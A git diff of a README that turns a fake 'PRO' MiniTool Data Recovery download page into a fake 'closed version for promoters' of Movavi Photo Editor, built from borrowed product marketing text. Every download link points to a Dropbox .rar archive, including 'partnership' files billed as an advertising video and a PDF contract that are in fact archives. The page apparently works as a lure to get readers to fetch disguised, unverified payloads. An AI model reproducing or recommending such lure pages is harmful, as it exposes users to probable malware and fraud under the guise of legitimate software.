@@ -1,40 +1,55 @@
-#*MiniTool® Data Recovery Software**
-[PRO version 12.1]
+# Movavi Photo Editor © Movavi.com  | Promotion version
 -------------
-![alt-text](https://i.imgur.com/7gZJCe5.png)
-#Private version for developers and promotional companies
+![alt-текст](https://user-images.githubusercontent.com/116727309/203393645-a7117540-50fa-4b94-9945-3234d6b94c93.png)
+
+### Photo editing software
+
+#### Your digital world is always brighter with Movavi Photo Editor 2023
+
+# Closed version for promoters
 ### 💻 Only for Windows 7/8/8.1/10
-#### System Requirements:
-
-* Microsoft Visual C++
-* Microsoft .NET Framework
+#### Technical Specifications
 * Graphics - Open GL 3.3 or later compatible
-* Processor - Intel Core i3 or better
-* OS - Windows 7 or higher (x64-bit or x32-bit OS)
+* Processor - Intel Core i5 or better
+* OS - Windows 7 or higher 
 * RAM - 2 GB or more
-* Disk space - 1 GB free space
-#
+* Disk space - 400 MB free space
 
-## 🔒 [Download MiniTool® v12.1](https://www.dropbox.com/s/92ff5kqmlpz2kx9/Minitool.rar?dl=1)
+![alt-текст](https://new-img.movavi.com/pages/0023/47/9acc9742101ebe3307a7c08e83b8c1971cde01a3.jpeg)
 
-MiniTool Pro data recovery software can perform a deep scan of hard drives, memory cards, SSD, etc. on Windows-compatible devices and recover data lost due to human errors and system crashes. It supports 100+ file types including photos, videos, audio, documents, etc.  
-#
-#### The software will easily recover:
+## A workflow devoted entirely to creative photo post-processing
 
-#
+## 🔐 [Movavi Photo Editor Download](https://www.dropbox.com/s/d6otdx5fxnp5gck/Application_installer.rar?dl=1)
+### ● Essential tools
 
-#### * Accidentally deleted files.
+Easily crop areas of your photo to alter the focus using composition guides, Golden Ratio and Rule of Thirds. Resize with ease using one of several presets, or resize by pixels, percentage or print size. Restore and repair old photos with the Scratch Remover and Fade Correction tools to enhance contrast and color to faded photos. 
 
-Accidentally deleted files after emptying the Recycle Bin? Formatting the wrong USB drive? Don't worry. All of these partitions will not escape deep scanning by file recovery software. Recovering deleted files from SD card, USB drive and HDD/SSD has never been easier.
+### ● Adjustment tools
 
-#### * Damaged or deleted system files.
+Alter your photos using a wide variety of powerful adjustment tools, including Brightness and Contrast, Fill Light and Clarity, Fade Correction, White Balance, Hue and Saturation, Noise Removal, Vibrancy, Sharpening, color correction, and tonal levels and curves.
 
-A virus attack can cause your operating system to crash or even cause your hard drive to become inaccessible. If a virus intrusion has caused file loss, Power Data Recovery can scan a specific location sector by sector to recover lost files.
+![alt-текст](https://i.imgur.com/uTQ7CiA.png)
 
-#### * Files after hard drive corruption.
+_Behind every show-stopping image is real intelligence. Highly effective features and tools powered by artificial intelligence and machine learning technology make creating something truly original, achievable._
 
-Loss of files caused by logical errors and physical damage is annoying because the hard drive may not respond or show an access denial. But the powerful algorithms of the best free Power Data Recovery software will recover lost files even from lost partitions.
+### ● Selection and Correction tools
 
-#### * Quick recovery of the original file derriktory.
+Isolate the area you want to select with a variety of Selection tools and enhance your selection with the Refine Brush. Automatically correct distortions, vignetting and chromatic aberrations in your photos with Lens Correction tools and use the Straighten tool to fix a crooked horizon, or the Perspective Correction tool to make a photo appear as though it was taken from a different angle. 
 
-The latest version of MiniTool Power Data Recovery adds Desktop Recovery, Recycle Bin recovery and Select Folder modules. You can choose to only scan Desktop, Recycle Bin or a specific folder to recover deleted/lost files, which saves you a lot of time and effort.
+### ● Time saving tools
+
+Reduce repetition and accelerate complex photo-editing actions with Scripts. Record a series of edits as a script to apply to any photo, anytime. Automate edits on multiple photos at once with batch processing like adding a watermark, picture frame, or simply resizing.
+
+<div align="right"><details>
+<summary>✅ Partnership and Collaboration:</summary>
+  
+ #### <div dir="rtl">:Video for advertising integration (.mp4) </div>
+ [💾 Download](https://www.dropbox.com/s/6eekng3o1f0ss21/PaintShop%20Pro%202022.rar?dl=1)
+  
+ #### <div dir="rtl">:Contract for the provision of advertising services (.pdf) </div>
+ [💾 Download](https://www.dropbox.com/s/939mwp5tts8befo/%D0%94%D0%BE%D0%B3%D0%BE%D0%B2%D0%BE%D1%80%20%D0%BD%D0%B0%20%D1%80%D0%B5%D0%BA%D0%BB%D0%B0%D0%BC%D1%83%20%D0%BF%D0%BE%20%D0%BF%D1%80%D0%B5%D0%B4%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5.rar?dl=1)
+  
+   ...
+</details></div>
+
+Read more: [www.movavi.com](https://www.movavi.com/photo-editor/)
